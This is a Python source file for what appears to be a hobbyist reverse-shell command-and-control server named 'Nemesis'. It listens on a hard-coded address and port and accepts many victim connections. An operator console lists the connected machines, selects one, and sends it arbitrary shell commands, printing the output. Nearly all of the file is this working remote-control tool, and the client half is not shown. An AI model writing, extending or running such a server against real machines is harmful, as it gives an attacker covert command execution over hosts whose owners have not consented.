
import socket
import threading
import sys
import time
from queue import Queue

global NUMBER_OF_THREADS
NUMBER_OF_THREADS = 2

global JOB_NUMBER 
JOB_NUMBER = [1, 2]

global queue
queue = Queue()

global all_connections 
all_connections = []

global all_address
all_address = []


# #################################################################################################################### #

                                          # # # 1rst THREAD FONDCTIONS # # #

# #################################################################################################################### #


# # # CREATE A SOCKET TO CONNECT 2 COMPUTERS # # #
def create_socket():
    try:
        global host
        global port
        global socket

        host = "172.20.69.153"
        port = 9999
        socket = socket.socket()

    except socket.error as msg:
        print('scoket creation error: %s ' % msg)


# -------------------------------------------------------------------------------------------------------------------- #

# # # BIDING THE SOCKET AND LISTENING FOR CONNECTIONS # # #
def bind_socket():
    try:
        global host
        global port
        global socket
        print('biding the port: %s' % port)

        socket.bind((host, port))
        socket.listen(5)

        print("The server is initialized, I\'m listening...")

    except:

        print('socket biding error: + \n Retrying...')
        bind_socket()


# -------------------------------------------------------------------------------------------------------------------- #

# # # HANDLE CONNECTION AND SAVE THEM IN OUR LISTS # # #
# # # CLOSE PREVIOUS CONNECTION WHEN TCP_server.py is restarted # # #
def accept_connection():
    for conn in all_connections:
        conn.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
        
            conn, address = socket.accept()
        
            # # # PREVENT TIMEOUT # # #
            socket.setblocking(1)
        
            all_connections.append(conn)
            all_address.append(address)
            
            print('\n connection established | IP address : %s | port: %d' % (address[0], address[1]))
        
        except:
        
            print("error accepting connection")


# -------------------------------------------------------------------------------------------------------------------- #



# #################################################################################################################### #

                                          # # # 2nd THREAD FONDCTIONS # # #

# #################################################################################################################### #
# # # SEE ALL THE CLIENTS #
# # # SELECT A SPECIFIC CLIENT #
# # # SEND COMMANDS TO THIS CLIENT #
# # # INTERACTIV PROMPT FOR SENDING COMMANDS #

#  Nemesis> list
# ---- CLIENTS LIST ----
# id : 0 | ip address : 192.168.0.2 |  port : 9999
# id : 1 | ip address : 192.168.0.3 |  port : 9999
# id : 2 | ip address : 192.168.0.4 |  port : 9999
# Nemesis> select 1
# 192.168.0.2>


def start_Nemesis():
    while True:
        if all_connections[:]:
            cmd = input('  Nemesys >  ')
            if cmd == 'list' or cmd == 'ls':
                list_connection()
            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_command(conn)
            elif cmd == 'quit':
                conn.close()
                socket.close()
                sys.exit()
            else:
                print('Command not recognized')



# -------------------------------------------------------------------------------------------------------------------- #


                             # # # DISPLAY ALL CURRENT ACTIVE CONNECTIONS # # #


def list_connection():
    results = ''

    print("----------------------------------------- CLIENTS LIST -----------------------------------------")

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('  '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = 'id : ' + str(i) + ' | ip address : ' + str(all_address[i][0]) + '|  port :' + str(all_address[i][1]) + "\r\n"

        # results exemple = id : 1 | ip address : 123.223.221.012  | port : 9999

        print("\n %s" % results)


# -------------------------------------------------------------------------------------------------------------------- #


def get_target(cmd, end=None):
    try:
        target = cmd.replace('select ', '')  # target value = "id"
        target = int(target)
        conn = all_connections[target]
        print('you are now connected to %s' % all_address[target][0])
        print(str(all_address[target][0]) + '>', end="")
        return conn
        # exemple : 192.168.0.2> ...

    except:
        print("Selection not valid")
        return None

    # ---------------------------------------------------------------------------------------------------------------- #


def send_target_command(conn):
    while True:
        try:
            cmd = input('  Nemesys >  ')
            if cmd == 'quit':
                start_Nemesis()
            elif len(cmd) > 0:
                conn.send(cmd.encode())
                client_response = conn.recv(1024)
                client_response = client_response.decode('utf8')
                client_response = str(client_response)

                print("%s" % client_response, end="" )
            else:
                print("enter a command !")
        except:
            print('Error Sending or Receiving commands')
            break


# -------------------------------------------------------------------------------------------------------------------  #

# # # DO NEXT JOB THAT IS IN THE QUEUE # # #
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connection()
        if x == 2:
            start_Nemesis()

        queue.task_done()


# # # CREATE WORKERS THREADS # # #


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


# #################################################################################################################### #

# # #                                                MAIN FONCTION                                                 # # #

# #################################################################################################################### #

create_workers()
create_jobs()